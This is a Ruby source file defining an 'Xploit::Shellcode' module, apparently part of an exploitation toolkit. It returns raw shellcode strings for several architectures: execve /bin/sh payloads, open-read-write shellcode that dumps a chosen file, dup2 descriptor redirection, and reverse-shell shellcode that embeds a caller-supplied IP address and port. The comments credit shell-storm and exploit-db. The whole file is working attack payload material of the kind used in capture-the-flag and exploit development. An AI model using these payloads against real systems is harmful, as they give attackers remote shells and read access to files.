# coding: ascii-8bit

module Xploit

  module Shellcode
  
    module_function
    
    def shellcode(arch)
      case arch
      when :x86
        # http://inaz2.hatenablog.com/entry/2014/03/13/013056
        "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"
      when :x64
        # http://shell-storm.org/shellcode/files/shellcode-806.php
        "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
      when :arm
        # http://shell-storm.org/shellcode/files/shellcode-698.php
        "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x08\x30\x49\x1a\x92\x1a\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68"
      when :mipsel
        # https://www.exploit-db.com/exploits/35868/
        "\xff\xff\x06\x28\xff\xff\xd0\x04\xff\xff\x05\x28\x01\x10\xe4\x27\x0f\xf0\x84\x24\xab\x0f\x02\x24\x0c\x01\x01\x01"
      end
    end
   
    def orw(arch, path)
      case arch
      # http://shell-storm.org/shellcode/files/shellcode-73.php
      when :x86      
        "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff#{path}"
        
      # http://shell-storm.org/shellcode/files/shellcode-878.php
      when :x64
        "\xeb\x3f\x5f\x80\x77#{(path.length).chr}\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff#{path}A"
      end
    end
    
    def dup2(arch, newfd = 3)
      case arch
      when :x86
        "\x31\xff\x6a\x3f\x58\x6a#{newfd.chr}\x5b\x89\xf9\xcd\x80\x47\x83\xff\x03\x75\xf0"
      when :x64
        "\x48\x31\xdb\x6a\x21\x58\x6a#{newfd.chr}\x5f\x48\x89\xde\x0f\x05\x48\xff\xc3\x48\x83\xfb\x03\x75\xec"
      end
    end
   
    def reverse_shell(arch, ip, port)
      case arch
      when :x86
        # http://shell-storm.org/shellcode/files/shellcode-883.php
        "\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1\xcd\x80\x92\xb0\x66\x68" + ip.split(".").map{|a| a.to_i.chr}.join + "\x66\x68" + [port].pack("n") + "\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
      when :x64
        # http://shell-storm.org/shellcode/files/shellcode-857.php
        "\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a" + "\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0" + "\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24" + "\x02" + [port].pack("n") + "\xc7\x44\x24\x04" + ip.split(".").map{|a| a.to_i.chr}.join + "\x48\x89\xe6\x6a\x10" + "\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48" + "\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a" + "\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54" + "\x5f\x6a\x3b\x58\x0f\x05"
      end
      
    end
    
  end
  
end
